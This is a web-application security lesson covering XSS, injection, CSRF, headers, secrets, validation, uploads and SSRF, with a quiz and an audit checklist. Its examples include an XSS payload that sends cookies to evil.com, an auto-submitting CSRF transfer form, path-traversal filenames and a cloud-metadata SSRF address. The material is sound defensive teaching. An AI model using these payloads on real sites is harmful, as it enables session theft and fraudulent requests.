You don't need to be a security specialist, but shipping a web application without knowing these attacks is like driving without knowing what a red light means.

# XSS — Cross-Site Scripting

The attacker gets their JavaScript to run on your page, in your users' browsers, with their session.

```js
// ✗ Vulnerable
element.innerHTML = `<p>Welcome back, ${username}</p>`;
```

If `username` is `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`, every visitor who sees that name ships their cookies to the attacker.

**Defences:**

```js
// 1. textContent, not innerHTML — the browser treats it as text, not markup
element.textContent = `Welcome back, ${username}`;

// 2. Build DOM nodes rather than HTML strings
const p = document.createElement('p');
p.textContent = username;

// 3. If you genuinely need user-supplied HTML, sanitise it
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHtml);

// 4. Escape on the server when rendering templates
//    (most template engines do this by default — know which syntax opts out:
//     {{ }} escapes in Handlebars, {{{ }}} does not)
```

Plus a **Content Security Policy**, which limits the damage even if something slips through:

```text
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

:::warn The three places XSS hides
1. **Stored** — the payload is saved in your database (a comment, a profile name) and served to everyone.
2. **Reflected** — the payload comes from the URL and is echoed back: `?search=<script>…`.
3. **DOM-based** — no server involvement: `element.innerHTML = location.hash`.

Anywhere user input becomes markup. Also watch `href="javascript:…"`, `srcdoc`, `eval`, `setTimeout('string')` and `new Function` — all of them turn data into code.
:::

# SQL injection

Covered in the SQL track, and worth repeating because it never stops happening:

```js
// ✗ db.query(`SELECT * FROM users WHERE email = '${email}'`)
// ✓
db.query('SELECT * FROM users WHERE email = $1', [email]);
```

**Parameterise everything.** The same applies to NoSQL (`{ $ne: null }` injections in MongoDB), shell commands (`execFile` with an argument array, never `exec` with a concatenated string), and LDAP.

# CSRF — Cross-Site Request Forgery

The attacker makes *your logged-in user's browser* send a request to your site without their knowledge:

```html
<!-- On evil.com -->
<form action="https://yourbank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

The browser attaches your bank cookies automatically. The server sees a perfectly valid authenticated request.

**Defences:**

```js
// 1. SameSite cookies — blocks the cookie on cross-site POSTs. The big one.
cookie: { sameSite: 'lax', httpOnly: true, secure: true }

// 2. CSRF tokens — a random per-session value in a hidden field, checked server-side
// 3. Check the Origin / Referer header on state-changing requests
// 4. Never use GET for anything that changes state
```

`SameSite=Lax` is the default in modern browsers and blocks most of this. Token-based protection is still worth adding for anything sensitive.

# Security headers

```js
import helmet from 'helmet';
app.use(helmet());          // sets sensible defaults for most of these
```

| Header | Protects against |
|---|---|
| `Content-Security-Policy` | XSS, data exfiltration |
| `Strict-Transport-Security` | Downgrade to HTTP |
| `X-Content-Type-Options: nosniff` | MIME-sniffing attacks |
| `X-Frame-Options: DENY` (or CSP `frame-ancestors`) | Clickjacking |
| `Referrer-Policy` | Leaking URLs to third parties |
| `Permissions-Policy` | Unwanted camera/geolocation access |

Check yours at securityheaders.com — it takes thirty seconds.

# HTTPS, always

- Free certificates from Let's Encrypt; most hosts do it automatically.
- Redirect all HTTP to HTTPS.
- Set HSTS so browsers refuse plain HTTP afterwards.
- Without TLS, anyone on the same network reads passwords, session cookies and everything else in plain text.

# Secrets

```js
const dbPassword = process.env.DB_PASSWORD;        // ✓
```

- **Never in the repository.** `.env` in `.gitignore`, always.
- **Never in front-end code.** Everything the browser downloads is public.
- **Rotate anything that leaks**, immediately — committed secrets are in the history on every clone.
- Use your platform's secret manager in production, not a file.
- Enable secret scanning on your repository. GitHub does this for free.

# Input validation

```js
import { z } from 'zod';

const CreateUser = z.object({
  email: z.string().email().max(255),
  age: z.number().int().min(13).max(120),
  role: z.enum(['user', 'editor'])           // never accept 'admin' from a client
});

const result = CreateUser.safeParse(req.body);
if (!result.success) {
  return res.status(422).json({ error: 'Validation failed', details: result.error.issues });
}
```

Validate at the boundary, with an allowlist of what's permitted rather than a blocklist of what isn't. And beware **mass assignment**:

```js
// ✗ A client can set any column, including is_admin
await db.update('users', req.body, { id: userId });

// ✓ Pick explicitly
const { name, bio } = req.body;
await db.update('users', { name, bio }, { id: userId });
```

# File uploads

- Validate the **content**, not the filename or the client-provided MIME type — both are trivially forged. Check magic bytes.
- **Never** save with the user's filename (`../../etc/passwd`, `shell.php`). Generate your own.
- Store outside the web root, or on object storage, and serve through a handler.
- Enforce a size limit at the proxy *and* the application.
- Re-encode images; that strips embedded payloads and EXIF data.

# Dependencies

```bash
npm audit
npm audit fix
```

Most of your code is other people's code. Keep it patched, enable Dependabot, and be suspicious of new packages with few downloads — supply-chain attacks via typosquatted package names are common and effective.

# Other things worth knowing

- **Rate limiting** on login, registration, password reset and anything expensive.
- **IDOR** (insecure direct object reference) — check ownership on every record access, as in the auth lesson.
- **SSRF** — if your server fetches a user-supplied URL, it can be pointed at internal services (`http://169.254.169.254/` reads cloud metadata credentials). Allowlist destinations.
- **Open redirects** — validate any `?next=` parameter against your own origin.
- **Logging** — log security events, never log secrets, passwords, tokens or full card numbers.
- **Error messages** — generic to the client, detailed in your logs.

# A realistic posture

You will not achieve perfect security, and chasing it is not a good use of your time. What is:

1. **Parameterise every query.**
2. **Escape all output** (`textContent` by default).
3. **Hash passwords with bcrypt or Argon2.**
4. **HTTPS with HSTS.**
5. **HttpOnly, Secure, SameSite cookies.**
6. **Check authorisation on every request, per record.**
7. **Validate input with an allowlist.**
8. **Keep dependencies patched.**
9. **Keep secrets out of the repo.**
10. **Rate limit authentication.**

That list covers the overwhelming majority of real-world attacks on ordinary web applications. Read the OWASP Top Ten once a year; it's short and it's the industry's shared checklist.

:::quiz
? What is the primary defence against XSS when displaying user input?
- Input validation
- Using `textContent` instead of `innerHTML` *
- HTTPS
- A firewall
> Escaping on output is the reliable fix; validation alone can't anticipate every context.

? How does `SameSite=Lax` help?
- It encrypts the cookie
- It stops the browser sending the cookie on cross-site POST requests *
- It shortens the cookie's life
- It prevents XSS
> That's the CSRF attack's mechanism, removed by default.

? Which is a mass-assignment vulnerability?
- `SELECT *`
- Passing `req.body` straight into a database update *
- Using innerHTML
- Storing passwords in plain text
> A client can then set fields you never intended, such as `is_admin`.

? You must accept user-supplied HTML for a rich-text editor. What do you do?
- Trust it; the editor already validates
- Store it and render with innerHTML
- Sanitise it with a maintained library such as DOMPurify *
- Strip all angle brackets
> Hand-rolled sanitisers miss cases; use a battle-tested one.

? A file upload arrives with the MIME type `image/png`. Can you trust it?
- Yes, browsers set it correctly
- No — the client controls it; check the file's actual bytes *
- Only over HTTPS
- Only for images
> Filename and MIME type are both attacker-controlled.

? Your server fetches a URL supplied by the user. What is the risk?
- XSS
- SSRF — it can be pointed at internal services and cloud metadata *
- CSRF
- SQL injection
> Allowlist the destinations, and block internal address ranges.
:::

:::exercise Audit an application
Take any app you've built (or the API from the earlier lesson) and check each:

1. Is every query parameterised?
2. Does any code path put user data into `innerHTML`?
3. Are passwords hashed with bcrypt/Argon2 at an appropriate cost?
4. Do cookies set `httpOnly`, `secure` and `sameSite`?
5. Does every record-level endpoint verify ownership?
6. Is `req.body` ever passed wholesale into a database write?
7. Are there secrets in the repository or its history?
8. Does `npm audit` report anything?
9. Are login attempts rate limited?
10. Run it through securityheaders.com.

Fix what you find, worst first.
:::
